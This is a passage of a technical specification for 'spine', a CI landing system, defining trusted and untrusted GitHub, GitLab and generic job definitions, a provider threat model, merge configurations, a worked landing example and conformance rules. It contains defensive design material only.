- **The push credential is `SPINE_PUSH_TOKEN` and never `github.token`.** PB §7.4 rule 0: *"the bypass principal of configuration (a) is a deploy key or app installation only the trusted job holds, never the Actions token both jobs share."* The base64 of the credential is registered with `::add-mask::` before it is written anywhere, and `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_0`/`GIT_CONFIG_VALUE_0` inject it as configuration without any file on disk (git ≥ 2.31).

### 7.4 The environment

`spine-trusted`, with **Deployment branches and tags → Selected branches → `main` only**. The pipeline key, the push credential and nothing else are environment secrets there. This is PB §7.4 rule 0's "a provider environment whose deployment-branch rule is the trunk only", and it composes with §7.1's requirement that trunk be the default branch: a `workflow_run` job runs on the default branch ref, so the rule admits it and admits nothing else — a `merge_group` job on `gh-readonly-queue/*` fails it, which is what PB §7.4 rule 0 says of `merge_group` and why.

`SPINE_TRUST_ROOT` is a repository **variable**, not a secret: it must be readable by the untrusted job too, since `spine check --ci` refuses to run without one (PB §7.5) and `--collect` runs under `--ci`. §15 D13.

### 7.5 GitHub's merge queue is configuration (b)

PB §5.4 offers GitHub merge queue as configuration (a)'s answer to starvation. It is not available as one. **A merge queue creates the trunk commit itself**, and PB §7.4 rule 5 precondition 4 defines exactly that as configuration (b): *"this run performs step 6's compare-and-swap itself and the object it pushes is the object that becomes trunk's tip … a queue that creates the trunk commit itself is configuration (b) whatever it is called."* §15 D4.

So the definitions above use no merge queue, and a repository that enables one has moved to (b) whether or not it says so: precondition 4 fails on every landing, `C-M4` evaluates `off`, the rule-5 `G11` wire is raised, and every landing takes a human reading. §11 states what (b) is and what it costs.

## 8. GitLab CI

### 8.1 What GitLab can and cannot give

- **The trusted job's definition does come from trunk**, structurally: it runs in a pipeline whose `ref` is trunk, so `.gitlab-ci.yml` and everything it includes are read at trunk.
- **The pipeline key is genuinely unreachable from a candidate**: mark `SPINE_PIPELINE_KEY` and `SPINE_PUSH_TOKEN` **protected**, protect trunk, and leave `intent/*`, `quick/*` and `spine/upgrade-*` unprotected. A merge-request pipeline runs on the source branch ref, which is unprotected, so the variables are simply absent. This is the same kind of structural guarantee GitHub's environment rule gives, and it is what PB §7.4 rule 0 means by "a protected variable, `intent/*` and `quick/*` unprotected".
- **The untrusted job's definition does *not* structurally come from trunk.** An MR pipeline reads `.gitlab-ci.yml` from the *candidate*, and while that file `include:`s trunk's job definitions, the candidate can delete the include, replace it, or add a job of its own. Deleting it is fail-closed: nothing collects, nothing lands. Replacing it is not: a candidate-defined job can write a result file whose every header field it copied from trunk's manifest.
- **And the trusted side cannot tell.** GitLab's API reports a pipeline's `sha`, `ref`, `source` and `user`; it does not report which configuration a pipeline was assembled from. There is no per-run evidence to check.

**Two consequences, both fail-closed.** `spine init --ci gitlab` refuses `merge.auto = on`, exactly as it does for `generic` (PB §7.4 rule 0). And **auto-merge precondition 2 gains a third conjunct** (§14 R14): it holds iff `keys_visible=false`, `tool=` is the base's pin, **and** this run established that the ingested file came from a trunk-defined untrusted job. On GitLab and on `generic` it never does, so precondition 2 is `"unmet"`, the rule-5 `G11` wire is raised, and every landing takes a human reading even if a human edits `C-M4` to `on` by hand — which they can, `init`'s refusal being a refusal to *write*, not a gate.

**A repository that wants rule 0 in full on GitLab uses `--ci generic`** and points the project's *CI/CD configuration file* setting at a file in a separate, protected control project. Then both definitions live outside the repository and §9 applies unchanged. That is not a second GitLab mode: it is `generic`, with GitLab as the runner. §18 OPEN-6.

### 8.2 `.gitlab-ci.yml`

```yaml
# Rendered by `spine init --ci gitlab` from template ci-gitlab@N. spine-owned.
# Requires GitLab >= 15.0 for variable expansion in `include:project`.
include:
  - project: '$CI_PROJECT_PATH'
    ref: 'main'
    file:
      - '/.spine/gitlab/untrusted.yml'
      - '/.spine/gitlab/trusted.yml'

stages:
  - spine
```

### 8.3 `.spine/gitlab/untrusted.yml`

```yaml
spine-collect:
  stage: spine
  interruptible: true
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"
           && $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == "main"
           && $CI_COMMIT_REF_NAME =~ /^(intent\/|quick\/|spine\/upgrade-)/'
    - when: never
  variables:
    GIT_STRATEGY: clone
    GIT_DEPTH: 0
    SPINE_TRUNK: "main"
  script:
    - |
      set -eu
      git fetch --no-tags --prune origin \
        "+refs/heads/$SPINE_TRUNK:refs/remotes/origin/$SPINE_TRUNK" \
        "+refs/heads/$CI_COMMIT_REF_NAME:refs/heads/$CI_COMMIT_REF_NAME"
      git checkout -q "$CI_COMMIT_REF_NAME"
      d="$(mktemp -d)"
      git show "origin/$SPINE_TRUNK:.spine/ci.sh" >"$d/ci.sh"
      rc=0
      sh "$d/ci.sh" collect "$SPINE_TRUNK" "$CI_COMMIT_REF_NAME" >"$d/out" || rc=$?
      if [ "$rc" -eq 2 ]; then echo "spine: ci.sh refused" >&2; exit 1; fi
      line="$(cat "$d/out")"
      case "$line" in result=*) ;; *) echo "spine: no result line" >&2; exit 1 ;; esac
      echo "spine: handing over ${line#result=}" >&2
      exit "$rc"
  artifacts:
    when: always
    expire_in: 1 day
    paths:
      - ".spine/cache/results/"
```

**GitLab preserves the path for free.** Artifacts are zipped relative to the project directory, so the entry is literally `.spine/cache/results/<T>.jsonl`, and gitignored files are collected like any other. No staging copy is needed and none is made. The trusted job's shape check (§6.3 step 3) is unchanged.

`SPINE_TRUST_ROOT` is an unprotected project **variable** so this job can read it; the key variables are protected and are therefore absent here, which is what `ci.sh`'s probe asserts by not refusing.

### 8.4 `.spine/gitlab/trusted.yml`

The trusted job is a scheduled pipeline on trunk. A schedule has no candidate, so it discovers one — and PB §7.4 rule 0 offers "a schedule that polls for candidates" without saying how, which is a hole an implementer cannot fill without inventing. §15 D25. The discovery is fixed here and is deterministic:

1. Fetch `refs/heads/intent/*`, `refs/heads/quick/*`, `refs/heads/spine/upgrade-*`.
2. Sort the candidate ref names **ascending by bytes**. This is an ordering, not a priority: whichever candidate is attempted, the CAS decides, and a candidate not attempted this run is attempted the next.
3. For each in turn, ask the API for a pipeline whose `sha` is that ref's tip and whose `source` is `merge_request_event`, and for a `spine-collect` job in it with an artifact. The first candidate that has one is this run's candidate.
4. Download that job's artifact and land.

A candidate whose artifact is for a stale tip is caught by `tree=`, not by discovery (§6.3 step 4). **`base-moved` needs no re-queue step on GitLab**: the next scheduled pipeline rediscovers the candidate against the new tip. That is the one place the schedule model is better than the chained one.

```yaml
spine-land:
  stage: spine
  interruptible: false
  resource_group: spine-land
  rules:
    - if: '$CI_PIPELINE_SOURCE == "schedule" && $CI_COMMIT_REF_NAME == "main"'
    - when: never
  variables:
    GIT_STRATEGY: clone
    GIT_DEPTH: 0
    SPINE_TRUNK: "main"
  script:
    - |
      set -eu
      command -v jq >/dev/null || { echo "spine: jq is required" >&2; exit 3; }
      for v in SPINE_TRUST_ROOT SPINE_PIPELINE_KEY SPINE_PUSH_TOKEN; do
        eval "s=\${$v:-}"
        [ -n "$s" ] || { echo "spine: $v is unset (protected variable?)" >&2; exit 3; }
      done

      api="$CI_API_V4_URL/projects/$CI_PROJECT_ID"
      hdr="PRIVATE-TOKEN: $SPINE_PUSH_TOKEN"

      git remote set-url origin \
        "$(printf '%s' "$CI_REPOSITORY_URL" | sed "s#://[^@]*@#://spine:$SPINE_PUSH_TOKEN@#")"
      git fetch --no-tags --prune origin \
        "+refs/heads/$SPINE_TRUNK:refs/remotes/origin/$SPINE_TRUNK" \
        "+refs/heads/intent/*:refs/heads/intent/*" \
        "+refs/heads/quick/*:refs/heads/quick/*" \
        "+refs/heads/spine/upgrade-*:refs/heads/spine/upgrade-*"

      cand=''; jobid=''
      for ref in $(git for-each-ref --format='%(refname:short)' \
                     refs/heads/intent refs/heads/quick refs/heads/spine \
                   | LC_ALL=C sort); do
        sha="$(git rev-parse "refs/heads/$ref")"
        pid="$(curl -fsS -H "$hdr" \
               "$api/pipelines?sha=$sha&source=merge_request_event&per_page=1" \
               | jq -r '.[0].id // empty')"
        [ -n "$pid" ] || continue
        jid="$(curl -fsS -H "$hdr" "$api/pipelines/$pid/jobs?per_page=100" \
               | jq -r '[.[] | select(.name=="spine-collect")][0].id // empty')"
        [ -n "$jid" ] || continue
        cand="$ref"; jobid="$jid"; break
      done
      [ -n "$cand" ] || { echo "spine: no candidate with a result artifact" >&2; exit 0; }

      mkdir -p .spine/cache
      curl -fsS -H "$hdr" -o "$CI_PROJECT_DIR/art.zip" \
        "$api/jobs/$jobid/artifacts"
      rm -rf .spine/cache/results
      unzip -qq -o "$CI_PROJECT_DIR/art.zip" '.spine/cache/results/*' -d .
      rm -f "$CI_PROJECT_DIR/art.zip"
      n="$(find .spine/cache/results -mindepth 1 | wc -l | tr -d ' ')"
      [ "$n" = "1" ] || { echo "spine: artifact holds $n entries" >&2; exit 1; }
      f="$(find .spine/cache/results -mindepth 1)"
      { [ -f "$f" ] && [ ! -L "$f" ]; } || { echo "spine: not a regular file" >&2; exit 1; }
      case "${f##*/}" in *.jsonl) ;; *) echo "spine: not .jsonl" >&2; exit 1 ;; esac

      d="$(mktemp -d)"
      git show "origin/$SPINE_TRUNK:.spine/ci.sh" >"$d/ci.sh"
      bin="$(SPINE_INSTALL_DIR="$d/bin" sh "$d/ci.sh" install "$SPINE_TRUNK")"

      case "$cand" in
        quick/reseal-*)  set -- --land --reseal ;;
        intent/*)        set -- --land "${cand#intent/}" ;;
        quick/*)         set -- --land --quick "$cand" ;;
        spine/upgrade-*) set -- --land ;;
        *) echo "spine: unroutable candidate $cand" >&2; exit 3 ;;
      esac
      rc=0
      "$bin" check --ci "$@" </dev/null || rc=$?
      echo "spine: check --ci --land exited $rc (docs/spec/ci.md 6.6)" >&2
      [ "$rc" -eq 0 ] || exit 1
  artifacts:
    when: always
    expire_in: 90 days
    paths:
      - ".spine/cache/report.json"
```

`resource_group: spine-land` serialises trusted runs the way the GitHub `concurrency` group does. `interruptible: false` is not decoration: a landing interrupted between the CAS and the note push is exit 5's case with nobody to see it.

**A scheduled trigger is not a clock.** Nothing in the report, the envelope or the ledger is a function of when the schedule fired; the schedule only decides *whether* a run happens, and every fact the run records comes from git objects and the result file. This is GR §4.4.3's argument about the notes commit's own date, applied to the trigger instead of the object. §14 R28.

## 9. `--ci generic`

### 9.1 What it is

PB §7.4 rule 0: *"`--ci generic`: the trusted job's definition lives outside the repository, pinned to trunk — a `Jenkinsfile` read from a candidate is the candidate's, and `init` refuses `merge.auto = on` for it."* PB §11: *"a definition outside the repository."*

So `spine init --ci generic` **writes `.spine/ci.sh` and no definition at all**, and prints the contract below. It cannot do more: it does not know the provider, so it can neither render a definition nor check that one exists. PB §9's week-one instruction to "set up the two-job CI skeleton" has no `init` to lean on here, and says so. §15 D21.

### 9.2 What it can guarantee

Everything that is a property of git objects and of trunk's bytes, which is most of the design:

- The collector is trunk's, hash-verified against the base's pin, and it wrote the file — because `.spine/ci.sh` is read from `origin/<trunk>` and verifies the release before running it (§5.4 steps 4–5). A definition outside the repository cannot be edited by a candidate either, so this is *stronger* than the GitLab in-repository arrangement, not weaker.
- Every ingestion check: `tree=`, `base=`, `tool=`, the declared runner set (RF §8.3).
- Every gate that reads git objects: the floor (G14), the freeze (G8's blob clauses and the closure recomputation), the ledger (G9), reconstruction (G10), authority (G13, G15, G16), containment (G2), leases (G7).
- The seal, the envelope digest, the freeze digest, the gate report and its publication.
- **Under a lying runner, exactly what PB §7.4 says: provenance and blast radius, never correctness.** Nothing about `generic` changes that sentence in either direction.

### 9.3 What it cannot guarantee

Not because the arrangement is weak, but because **spine wrote none of it and can check none of it**:

- That the untrusted job's definition is trunk's rather than the candidate's.
- That the pipeline key is unreachable from the untrusted job. `.spine/ci.sh`'s probe refuses when the key is *visible in its environment*; a provider that hands the key to a sibling step, a service container or a build cache defeats it, and no probe inside one job can see that.
- That the trusted job runs from trunk, that its environment's branch rule is trunk-only, that the push credential is not the untrusted job's, or that no other job runs on candidate refs.
- That the result artifact reached the trusted job unmodified between the two.

**Therefore, and this is the whole of `init`'s refusal:** `merge.auto = on` is refused, and auto-merge precondition 2 is `"unmet"` on every run (§8.1's third conjunct). Every landing raises the rule-5 `G11` wire and takes one human reading, which the author may sign (PB §7.4 rule 5). A repository on `generic` has traded the last click for the freedom to run anywhere, and the seal says so on every landing forever: `threat=`, `profile=` and `mode=` are in the ledger, and the reading is counted by `spine stats`.

### 9.4 The generic contract

`spine init --ci generic` prints this and the operator implements it outside the repository.

**Job A — untrusted.** Runs on `intent/*`, `quick/*`, `spine/upgrade-*`. Definition stored outside the repository, pinned to trunk. No secret of any kind; no `SPINE_PIPELINE_KEY`, `SPINE_PUSH_KEY` or `SPINE_PUSH_TOKEN` in its environment; read-only repository credentials.

```sh
#!/bin/sh
# Job A — the untrusted half.  Runs nothing from the checkout before ci.sh.
set -eu
TRUNK=main
CANDIDATE="$1"          # intent/INT-042 | quick/<name> | spine/upgrade-<v>
export SPINE_TRUST_ROOT   # a variable, not a secret

case "$CANDIDATE" in
	intent/* | quick/* | spine/upgrade-*) : ;;
	*) echo "not a candidate ref: $CANDIDATE" >&2; exit 1 ;;
esac

git init -q .
git remote add origin "$REPO_URL"
git fetch -q --no-tags --prune origin \
	"+refs/heads/$TRUNK:refs/remotes/origin/$TRUNK" \
	"+refs/heads/$CANDIDATE:refs/heads/$CANDIDATE"
git checkout -q "$CANDIDATE"

d="$(mktemp -d)"
git show "origin/$TRUNK:.spine/ci.sh" >"$d/ci.sh"
rc=0
sh "$d/ci.sh" collect "$TRUNK" "$CANDIDATE" >"$d/out" || rc=$?
[ "$rc" -ne 2 ] || { echo "ci.sh refused" >&2; exit 1; }

line="$(cat "$d/out")"
case "$line" in result=*) : ;; *) echo "no result line" >&2; exit 1 ;; esac

# Hand over exactly one file, at exactly this repo-relative path.
publish_artifact "${line#result=}"     # provider-specific; one file, no extras
exit "$rc"
```

**Job B — trusted.** Runs only on trunk, from a definition outside the repository, with the environment restricted to trunk.

```sh
#!/bin/sh
# Job B — the trusted half.  Executes no repository code.
set -eu
TRUNK=main
CANDIDATE="$1"
export SPINE_TRUST_ROOT SPINE_PIPELINE_KEY SPINE_PUSH_TOKEN

git init -q .
git remote add origin "$REPO_URL"
git fetch -q --no-tags --prune origin \
	"+refs/heads/$TRUNK:refs/remotes/origin/$TRUNK" \
	"+refs/heads/intent/*:refs/heads/intent/*" \
	"+refs/heads/quick/*:refs/heads/quick/*" \
	"+refs/heads/spine/upgrade-*:refs/heads/spine/upgrade-*"
git checkout -q -B "$TRUNK" "refs/remotes/origin/$TRUNK"

mkdir -p .spine/cache/results
fetch_artifact_into .spine/cache/results      # provider-specific
n="$(find .spine/cache/results -mindepth 1 | wc -l | tr -d ' ')"
[ "$n" = 1 ] || { echo "artifact holds $n entries" >&2; exit 1; }
f="$(find .spine/cache/results -mindepth 1)"
{ [ -f "$f" ] && [ ! -L "$f" ]; } || { echo "not a regular file" >&2; exit 1; }

d="$(mktemp -d)"
git show "origin/$TRUNK:.spine/ci.sh" >"$d/ci.sh"
bin="$(SPINE_INSTALL_DIR="$d/bin" sh "$d/ci.sh" install "$TRUNK")"

case "$CANDIDATE" in
	quick/reseal-*)  set -- --land --reseal ;;
	intent/*)        set -- --land "${CANDIDATE#intent/}" ;;
	quick/*)         set -- --land --quick "$CANDIDATE" ;;
	spine/upgrade-*) set -- --land ;;
	*) echo "unroutable candidate: $CANDIDATE" >&2; exit 3 ;;
esac
rc=0
"$bin" check --ci "$@" </dev/null || rc=$?
publish_artifact .spine/cache/report.json     # keep the report; see 6.5
[ "$rc" -eq 0 ] || exit 1
```

Two placeholders are the operator's and are named rather than hidden: `publish_artifact` and `fetch_artifact_into` must move **one file, unmodified, preserving the relative path**, and `$REPO_URL` must be a credential the two jobs do not share.

## 10. What a provider can subvert, and what it cannot

PB §7.4's argument rests on this line, so it is drawn explicitly. "Provider" here means both the hosting service and anyone who can change its out-of-band configuration; "candidate" is the branch's code and its definition where the provider takes one from it.

### 10.1 Cannot be subverted, on any provider

| | Because |
|---|---|
| The seal, the envelope digest and every copied signature | SSH signatures over exact bytes, verified against `.spine/allowed_signers` at the seal's `base=` (PB §5.5). A provider that rewrites a byte lands `unattested` and G9 says so on the next run. |
| The ledger | G9 walks trunk first-parent from commits alone. No provider metadata, no note, no PR body is a source (PB §6.1, §7.4 rule 4). |
| Reconstruction | G10 clones and indexes before the push, in a scratch dir configured from the runner's pin on **both** sides (PB §6.3 G10). A provider cannot make a landing reconstructible that is not. |
| The floor | G14 over `merge-base..head`, from a list inside the pinned release. A provider cannot shrink it, and `C-A2` and every `paths.*` entry only extend it. |
| The freeze | Blob equality plus a closure recomputed by the pinned release over the approval commit's tree (`IR`). No CI arrangement participates. |
| Which release ran | `tool=` on the header against trunk's pin, and `tool=` on the seal (G15). Never a retry, never overridable, in any mode. |
| Which tree the results describe | `tree=` and `base=` against the `T` and `B` this run fixed (RF §8.3 step 1). A pass against any other tree is not a pass. |
| That trunk moved under a landing | The compare-and-swap. The ref update *is* the check; the loser's record is garbage by construction. |
| That a human read the landing, under the shipped defaults | `C-A3: hostile` fails precondition 0 on every run that tests anything, so the `G11` wire is universal and its review is a signed git object. |

### 10.2 Can be subverted, and by whom

| | Who | Bound |
|---|---|---|
| **The entire result file**, where the untrusted job's definition is the candidate's | the candidate | Every header field is a string a forger copies from trunk's manifest — `tool=`, `keys_visible=false`, `profile=container` included. **This is why rule 0 is structural and not a check.** GitHub closes it (`pull_request_target`); GitLab-in-repository and `generic` do not, and precondition 2 is `"unmet"` there for that reason (§8.1, §14 R14). |
| **Every `out` value, and every id, `fn` and `path` in the `result` section** | the candidate, on every provider | The residual PB §7.4 names and does not close: frozen tests import the code under test, so the candidate's code and its runner share a process (RF §9). No CI arrangement touches it. |
| **Whether the untrusted job runs at all** | the candidate, where it owns a trigger | Fail-closed: no file, `result-missing`, G1 fails. A candidate can deny itself a landing; it cannot buy one. |
| **Whether the pipeline key reaches an untrusted context** | the operator | `ci.sh`'s probe refuses when the key is in *its* environment; a sibling step, a service container or a cache that carries it is invisible to the probe. On GitHub the environment rule and on GitLab the protected-variable rule are what actually bound it; on `generic` nothing does. |
| **Whether the artifact is modified in transit** | the provider | Not detectable as *modification*: the trusted stage checks the file against trunk's pin and its own `T`, so a modified file must still satisfy `tool=`, `tree=`, `base=` and RF §4's grammar. It is exactly as forgeable as a candidate-written one, and the same precondition-2 answer applies. |
| **Who ends up as trunk's tip in configuration (b)** | the provider | The provider builds the commit; G10 proves the `L` `--print` built, not the object the provider creates. The next run's **G9** audits what actually landed, and a divergent commit lands `unattested` and loudly (§11). |
| **Whether the note reaches `refs/notes/spine`** | the provider | A lost note costs third-party recomputation of the judgement and nothing else (GR §4.4.4). No landing's validity, no gate result, no ledger state is a function of it. |
| **Liveness** | the provider | A provider that never runs the trusted job, or a trunk that moves faster than one re-verification per landing, starves landings. PB §5.4's answer is a provider queue as runner, never a bigger `C-M3`. |

### 10.3 Rule 0's four requirements, scored

| | GitHub | GitLab (in-repo) | generic |
|---|---|---|---|
| Untrusted job's definition from trunk | **yes** — `pull_request_target` reads the base branch's file | no — `.gitlab-ci.yml` is the candidate's; the `include:` can be removed | **unknown to spine** — true if the operator does it, uncheckable either way |
| Trusted job's definition from trunk | **yes** — `workflow_run` reads the default branch's file | **yes** — a pipeline on `ref=<trunk>` | unknown to spine |
| Key in a trunk-only environment | **yes** — environment deployment-branch rule | **yes** — protected variable + protected branch | unknown to spine |
| Untrusted job holds no secret | **yes** — `permissions: contents: read`, no environment | **yes** — protected variables are absent on unprotected refs | unknown to spine |
| **`init` writes `merge.auto = on`?** | permitted | **refused** | **refused** |
| **Precondition 2 reachable?** | yes | **no** | **no** |

## 11. Configurations (a) and (b)

**(a) — the trusted stage pushes the landing commit itself.** §7 and §8's definitions are (a). Precondition 4 is met: `--land` performs the CAS and the object it pushes is the object that becomes trunk's tip. The pipeline principal is on the branch-protection bypass list for required checks only; the non-fast-forward rule has no bypass list, and PB §11 makes denying non-fast-forward pushes on trunk *and* on `refs/heads/intent/*` a non-optional supplement.

**(b) — the provider owns the merge button, and it is not an auto-merge configuration.** PB §5.4 is unambiguous: *"Spine performs no CAS there, so G10 proves the `L` that `--print` built and not the commit the provider ultimately creates, and the body re-read is a check before a merge, never an atomic guard on the tip. Precondition 4 of §7.4 rule 5 therefore fails on every landing in (b): each one takes a review."*

The definition changes in exactly four places, and nothing else moves:

1. `C-M1: merge.strategy = squash`, and the last content commit on the candidate deletes `intents/<ID>.md`, so the provider's squash tree equals the sealed `tree=`.
2. The trusted job runs `spine check --ci --land <id> --print` instead of `--land`. `--print` emits a sealed envelope only for a run that would have landed; `--dry-run` never signs.
3. The job posts the printed envelope as the PR body with `gh pr edit --body-file` — never the web editor, whose CRLF hashes wrong — and posts the required check as a commit status on the PR head.
4. The required check re-reads the body through the provider API and fails before the merge if `git hash-object` over its fenced block ≠ `blob=`, if the seal's `head=` ≠ the PR head's content head `Hc`, or if its `base=` ≠ trunk's tip.

**What (b) loses, said once:** the pipeline signature (the provider's own key signs the commit instead), `H` under squash, atomicity, and G10 over the object that actually lands. **What it cannot lose:** anything else — a reordered base, a generic merge message or an edited body lands `unattested` and G9 says so on the next run, and the repair is a reseal. A rising reseal count is the signal to move to (a).

**A merge queue is (b).** §7.5.

## 12. Worked example

`INT-042: Invoice totals include tax`, the repository of RF §10 — `params.ci: "github"`, `params.langs: ["python","ts"]`, `params.isolation: "container"`, `params.timeout: 1800`, `params.trunk: "main"`, `object_format: sha1`, pinned `cli.version 1.4.0`, `C-A1: team`, `C-A3: hostile`, `C-M4: off`, `C-M1: merge`.

**A human opens a PR from `intent/INT-042` to `main`.** That is the event source (§7.1); nothing else about the PR is read by anything.

**The untrusted run.** `spine-collect` fires on `pull_request_target`. GitHub takes its definition from `main`. The guard step passes: the head repo is this repo and `intent/INT-042` matches `intent/*`. `actions/checkout` puts HEAD on the local branch `intent/INT-042` with full history; the next step fetches `origin/main` and strips the checkout's credential. Then:

```
git show "origin/main:.spine/ci.sh" >"$RUNNER_TEMP/spine/ci.sh"
sh "$RUNNER_TEMP/spine/ci.sh" collect main intent/INT-042
```

`ci.sh` sanitises `PATH`, finds no `SPINE_*` credential set, reads `SPINE_TRUST_ROOT`, checks git 2.45 ≥ 2.38, reads `origin/main:.spine/manifest.json`, confirms `params.trunk == "main"`, takes `dist_hash` `9f2e…`, fetches `<base>/9f2e…/artifacts.txt`, finds its SHA-256 equal to `9f2e…`, selects the one `x86_64-unknown-linux-musl` line, fetches and verifies that artifact, unpacks it, exports the allowlist, computes

```
T = 3f7b1c9d2a5e48f0b6c1d8e2a9f403b7c5d61e28
```

and runs `spine check --ci --collect`. The collector produces the twenty-line file of RF §10 at `.spine/cache/results/3f7b1c9d….jsonl` with `end.status: complete`, and exits 0. `ci.sh` prints one line:

```
result=.spine/cache/results/3f7b1c9d2a5e48f0b6c1d8e2a9f403b7c5d61e28.jsonl
```

and exits 0. The job copies that file to `$RUNNER_TEMP/spine-handoff/` and uploads it as `spine-result` — one file, no extras. The final step sees `rc=0` and the job is green.

**The trusted run.** `spine-land` fires on `workflow_run`. Its `if:` passes on all three clauses: `event == 'pull_request_target'`, `path == '.github/workflows/spine-collect.yml'`, and the head repository is this one. The `spine-trusted` environment releases `SPINE_PIPELINE_KEY` and `SPINE_PUSH_TOKEN` because the job runs on `main`, which is the only branch its deployment rule admits. The job checks out `main` with full history, fetches every `intent/*`, `quick/*` and `spine/upgrade-*` ref — without which the lease registry is empty and G7 is vacuous — installs the pinned release through `ci.sh install`, and downloads `spine-result` from run `$SPINE_RUN_ID` into `.spine/cache/results/`, where it lands at exactly

```
.spine/cache/results/3f7b1c9d2a5e48f0b6c1d8e2a9f403b7c5d61e28.jsonl
```

The shape check finds one regular file ending `.jsonl`. Then `spine check --ci --land INT-042`:

- Step 1 fixes `B` and `H`, computes `T` and finds `3f7b1c9d…` — the same tree, so ingestion's step 1 passes and this is not `base-moved`.
- `tool=` equals `1.4.0+sha256:9f2e…`; both runner tokens are ones the release assigns to `python` and `ts`.
- Precondition 1 holds: `params.isolation` is `container` and the header says `container`. Precondition 2 holds: `keys_visible=false` from a pinned collector, **and** this run established the untrusted job's definition came from trunk — the three `if:` clauses are that establishment.
- Precondition 0 fails, because `C-A3` is `hostile`. `C-M4` evaluates `off` — it was `off` anyway — and G11 raises one bare `class=tripwire` wire, collapsed to a single entry however many of its two reasons hold (GR §5.8).
- The landing enters `landing-review`. A human — the author is permitted, this being a tripwire and not a floor change — signs `Spine-Review class=tripwire … wires=G11 reason="…"`, and the next run lands.
- Step 5 proves reconstruction: `L` is pushed into a scratch clone `S`, both sides get the runner's `spine.trustRoot`, and the two canonical dumps are equal.
- Step 6 pushes `L` and deletes `refs/heads/intent/INT-042` atomically with two `--force-with-lease` guards, using `SPINE_PUSH_TOKEN`.
- **Then** the report is published: `git hash-object -w --stdin` over its canonical bytes, `git notes --ref=spine add -C <blob> <L>`, `git push origin refs/notes/spine`. `git cat-file blob $(git notes --ref=spine list <L> | cut -d' ' -f1) | sha256sum` now reproduces the seal's `report=`.
- `--land` exits 0. The job uploads `.spine/cache/report.json` as `spine-report` and goes green. The PR closes itself, its head branch having been deleted by the CAS.

The seal records `threat=hostile profile=container mode=team`, so the ledger says, for this landing forever, that a human read it and how strong the evidence behind its green suite was.

**One variation.** Had another intent landed between the collector's run and step 1, `T` would differ, ingestion step 1 would return `base-moved`, `--land` would exit 2, and the re-queue step would re-run `spine-collect` for run `$SPINE_RUN_ID`. The new run computes a new `T`, writes a new file, and the earlier file is never consulted again by this run or any other.

## 13. Determinism and conformance

An arrangement conforms when all of this holds:

1. `.spine/ci.sh` is byte-identical to §5.3 with the render tokens substituted, and no `@@` or `PIN_` token survives a render — §3.4's byte scan over every rendered CI file, run before any path is written, over a release manifest §3.4's schema accepts. A build with no such manifest renders nothing and refuses the plan whole.
2. It is executed from `git show "origin/<trunk>:.spine/ci.sh"`, written to a file outside the working tree, never piped into `sh -s`.
3. Its stdout carries exactly one line on success, and its exit codes are exactly §5.2's three.
4. The artifact list is the sha256sum-format bytes of §5.5, sorted by artifact name, and `dist_hash` is its SHA-256; the platform table is §5.5's; a target with zero or two artifacts is a refusal.
5. `collect` refuses when any of the three credential variables is set, and refuses without `SPINE_TRUST_ROOT`. It never strips them.
6. The untrusted job satisfies U1–U7; the trusted job satisfies T1–T9.
7. The untrusted job's only artifact is one result file, and the trusted job materializes it at `.spine/cache/results/<T>.jsonl` and checks the shape of the materialized tree.
8. The candidate-ref mapping is §6.4's, `quick/reseal-*` tested before `quick/*`.
9. The gate report is published to `refs/notes/spine` after the CAS, and a failed publish fails the job and retracts nothing.
10. `spine check --ci --land`'s exit codes are §6.6's, and the definition's reaction to each is §6.6's.
11. No candidate-controlled string is interpolated into a shell script by the CI templating language.
12. The trusted job restores no cache, runs no repository code, and pushes with a credential the untrusted job does not hold.
13. Nothing anywhere records a time, compares two, or derives a decision from one.
14. `init --ci gitlab` and `init --ci generic` refuse to write `merge.auto = on`, and precondition 2 is `"unmet"` on every run under both.

**Determinism claim.** For a fixed release, a fixed trunk tip and a fixed candidate tip, `.spine/ci.sh` is a deterministic function of `(trunk manifest, platform, network availability)` up to the collector it invokes, whose own determinism is RF §4.5's and is conditioned on `end.status == complete`. Nothing in the CI definitions introduces a second source of variation: no timestamp, no ordering by wall time, no provider-supplied value that reaches a gate. Two conforming arrangements on two providers produce the same landing commit for the same inputs, which is the property PB §1.1 sells and §10.1 is the audit of.

## 14. Resolved ambiguities

| # | What the playbook says | Resolution | Why |
|---|---|---|---|
| R1 | PB §6.7 lists `.spine/ci.sh` with an owner class, a template name and a blob id. PB §7.4 rules 0 and 2 say it is executed from trunk and installs and hash-verifies the collector. **No contents anywhere.** | §5.3's 319 lines, in full, with two modes, three exit codes, a single-line stdout contract, and computed digests. | The audit named it a blocker: a floor path that executes from trunk and hash-verifies the collector cannot be left to each implementer, because two implementations of it install different binaries from different places and neither can check the other. |
| R2 | "`.spine/ci.sh` is executed from `git show origin/<trunk>:.spine/ci.sh`, never from the checkout" (PB §7.4 rule 0). | Write those bytes to a file **outside the working tree** and run it. **Piping into `sh -s` is non-conforming.** | A shell reading its script from fd 0 shares that descriptor with every child. `ci.sh` spawns `tar`, `git`, `curl` and the collector, and the collector spawns runners the repository controls; the first child to read stdin consumes the rest of the script. The purest-looking reading of "executed from" is the one that hands candidate code the script's own remaining bytes. |
| R3 | Policy is read from `origin/<trunk>` (PB §7.4 rule 1), and `params.trunk` names trunk — inside the manifest that read requires. | The trunk name is `ci.sh`'s **positional argument**, supplied by the CI definition; trunk's own `params.trunk` is compared against it as a misconfiguration guard, never as the source. | The only in-repository source of the name is the candidate's manifest, and a candidate that could name its own trunk would choose where policy is read from. PB §7.3 already says `params.trunk` is "a rendering hint" and that the trusted stage protects its branch "out-of-band"; this is that sentence made executable. |
| R4 | `.spine/manifest.json` is JSON; PB fixes no serialization and CI images ship no guaranteed JSON parser. | `ci.sh` extracts exactly two members with an anchored, structure-split matcher that refuses absence **and** multiplicity, and needs `cli.version` not at all: the version is derived from the hash-verified artifact list. | Requiring `jq` puts a dependency between the pinned release and the job that installs it. Refusing on multiplicity rather than taking the first match is what makes an adversarial `files[]` path a refusal instead of a redirect — exercised in §5.3's verification against a path spelled `weird, {trunk}: "x"`. Deriving the version from the digest removes a string that could disagree with the hash beside it. |
